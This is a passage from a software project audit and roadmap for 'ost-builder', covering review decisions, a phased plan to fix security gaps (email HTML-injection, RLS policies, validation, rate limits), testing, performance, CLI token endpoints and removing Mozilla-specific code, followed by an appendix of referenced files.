		- **Endpoints the CLI needs that don't yet exist:** `POST /api/cli/tokens` (issue), `DELETE /api/cli/tokens/:id` (revoke), `GET /api/cli/tokens` (list). Plus the existing `/api/share/store` + `/api/share/store/:id` already cover library upload/download/share.
		- **Docs:** `docs/cli.md` with example agent prompts (`"Generate an OST for X, upload it to my library, get me the share link"`) — these become the most useful product demo.

---

## 6. Decisions made during review

Captured from Jenny's inline comments. Open questions are flagged.

| # | Topic | Decision |
|---|---|---|
| 1 | Backend choice | Keep Supabase; delete Cloudflare code; port the safety floor (rate limits, size cap, TTL+expiry+soft-delete, validators, CORS). |
| 2 | Orphan client surface | Remove `extendStoredShare` + `logout()` + `ttlDays` from client until the server supports them. |
| 3 | RLS | Yes — add policies; reserve service-role for system-only operations. |
| 4 | RBAC strategy | Write `docs/rbac.md` first; capability-based under the hood; plan for per-card permissions + multi-org. |
| 5 | Testing rule | Encode in `CLAUDE.md` + PR template + CI coverage gate. Quarterly test-quality audit + mutation testing on critical paths. |
| 6 | Email injection | Fix the escape bug; keep the preview (escaping doesn't remove it); truncate long previews. |
| 7 | Markdown-as-truth | Keep. New rule: structured metadata goes in sidecar tables keyed by stable card ID, never embedded in markdown. |
| 8 | shadcn unused components | Delete with confidence; grep to confirm, then drop the file + its peer deps. |
| 9 | Role-resolver duplication | Extract to `_shareUtils.mts` now (prerequisite for RBAC work). |
| 10 | Repo location | Move `ost-builder/` out of the Mozilla vault. Confirmed: Jenny's own project/fork, not Mozilla IP. |
| 10b | De-Mozilla the codebase | Mozilla is one *instance* of a multi-tenant product, not baked in. New visibility schema: `public` / `company-limited` / `private` with `org_id`. Generic copy, no hardcoded mozost URL, neutral seed content. Bundles with §2.1 RBAC multi-org work. |
| 14 | Test enforcement | CLAUDE.md is the prompt-level rule; pre-commit hook + CI check are the enforcement floor. Weekly (not quarterly) test-quality audit cadence — fast-moving project. |
| 11 | Bundle size | Diagnose with `rollup-plugin-visualizer` first; then lazy-load builder, drop framer-motion, prune deps. Also rule out the per-keystroke network calls as the real cause of slowness. |
| 12 | Deployment docs | Add `DEPLOYMENT.md`, `supabase/migrations/`, `runbook.md`. |
| 13 | CLI revival | Bring back, redesigned around PATs (not OAuth dance) so AI agents can drive it. Becomes the AI-first product surface. |

## 7. Suggested execution order

Each step de-risks the next. Numbered phases group things that can be done in parallel.

**Phase A — clear the decks (this week, ~1 day):**

1. Delete `packages/app/functions/`, `wrangler.toml`, `schema.sql`, `packages/app/functions/schema.sql`.
2. Update `CLAUDE.md` to say "Netlify + Supabase," remove the "Cloudflare Pages" line.
3. Delete the orphan client surface (`extendStoredShare`, `logout`, `ttlDays` send) so the UI matches the backend.
4. Commit a Supabase baseline migration (`supabase/migrations/0001_baseline.sql`) from current schema.
5. Extract `_shareUtils.mts` (the role-resolver dedupe). Two-file edit; no behavior change.
6. `npm audit fix` and remove the obvious dead deps (`@tanstack/react-query`).

**Phase B — close the security gaps (next 1–2 weeks):**

7. **Fix the email HTML-injection.** One-line per call site, plus `escapeHtml` helper. Add a unit test that fails without the fix.
8. **Write `docs/rbac.md`** — capabilities, role bundles, the visibility × auth matrix from §2.1. Run this past Jenny before policy work.
9. **Drop and rewrite the Supabase RLS policies** to match `docs/rbac.md`. Four policies already exist in the live DB (surfaced by the Phase A baseline dump — see §2.1 Update) but two have tautological joins and one blocks anonymous public reads. Step 1: `DROP POLICY` on all four. Step 2: write the new policy set from `docs/rbac.md`. Step 3: migrate the Netlify functions to call Supabase as the user (drop service-role for read/update/list). Keep service-role only for `share_members` insert at share creation.
10. **Add zod validation at every Netlify handler boundary.** Drops the "any string passes" footgun on `visibility`.
11. **Add rate limiting + payload size cap.** Pick `@upstash/ratelimit` or a Supabase table. Email send rate-limited per share.

**Phase C — testing safety net (next 2 weeks):**

12. **Amend `CLAUDE.md` with the testing rule** (§TL;DR 4 response). This is the rule that compounds.
13. Add `.github/PULL_REQUEST_TEMPLATE.md` with the testing checkbox.
14. Wire `@vitest/coverage-v8` into `package.json` with a starting baseline. Add `npm test` and coverage to CI.
15. Write the four high-leverage test suites (in this order): `resolveRole` truth table → share lifecycle → `ostStore` reducers → email-escape regression.
16. Add round-trip property tests on `parseMarkdownToTree` / `serializeTreeToMarkdown`.

**Phase D — performance + extensibility (next 2–4 weeks):**

17. Fix `ActiveCloudShareTracker` and `LibraryAutoSave` background traffic.
18. Wire `rollup-plugin-visualizer`. Diagnose bundle. Lazy-load `OSTBuilder` behind a route boundary.
19. Replace `framer-motion` with CSS transitions; delete unused shadcn components and their peer deps.
20. Refactor `ostStore` into slices (canvas / cards / share / comments).

**Phase E — agent surface (when Phase B is done):**

21. Implement `cli_tokens` table + `/api/cli/tokens` endpoints.
22. Rebuild CLI auth around PAT; verify all `library *` commands work end-to-end against Supabase.
23. `docs/cli.md` with agent-driven usage examples.

**Phase F — repo hygiene (whenever):**

24. Move `ost-builder/` out of the Mozilla vault.
25. Write `DEPLOYMENT.md` + `runbook.md`.
26. Scheduled cadence: **weekly** test-quality audit (per Jenny's update — fast-moving project), monthly dep audit.

**Phase G — de-Mozilla (bundle with §2.1 RBAC work in Phase B):**

27. Schema migration: rename visibility value `'mozilla'` → `'company-limited'`; add `org_id` column to `shares`.
28. Introduce `organizations` + `org_members` tables; Mozilla becomes one row, not a special-cased string.
29. Update `resolveRole` to use `org_id` for the company-limited branch; drop hardcoded `'mozilla'` string.
30. Generic auth copy across `StoredShareOpen.tsx` and `CommentsSection.tsx` (no "Mozilla" mentions).
31. Remove hardcoded `mozost.netlify.app` default in `share-store-comments.mts:57`; require env var.
32. Replace seeded Mozilla OST with a neutral onboarding template (or remove seeding entirely; let users create from in-app templates).

---

**Tracking:** all 44 items live as nested subtasks under Todoist task `6ghCqHw7Fx7pP2rR` ("Execute ost-builder codebase audit"). One phase per Todoist parent, action items as leaves.

---

## Appendix — files referenced

- `netlify.toml` — deployment config (Netlify functions root)
- `wrangler.toml` — orphan Cloudflare Pages config
- `netlify/functions/{share-store,share-store-item,share-store-comments,auth-me}.mts` — live backend
- `packages/app/functions/**` — dead Cloudflare Pages backend (21 files)
- `packages/app/src/store/ostStore.ts:1-628` — state store
- `packages/app/src/App.tsx:29-178` — auto-save + cloud tracker
- `packages/app/src/lib/storedShareApi.ts` — client API surface
- `packages/app/src/lib/markdownLinks.tsx` — markdown link rendering
- `packages/app/src/pages/Library.tsx:127-186` — library load flow
- `packages/cli/src/index.ts`, `packages/cli/src/http/client.ts` — CLI against CF endpoints
- `packages/app/e2e/canvas.spec.ts` — full E2E suite
- `packages/app/src/test/markdownOST.test.ts`, `urlEncoding.test.ts`, `localSnapshots.test.ts` — full unit suite
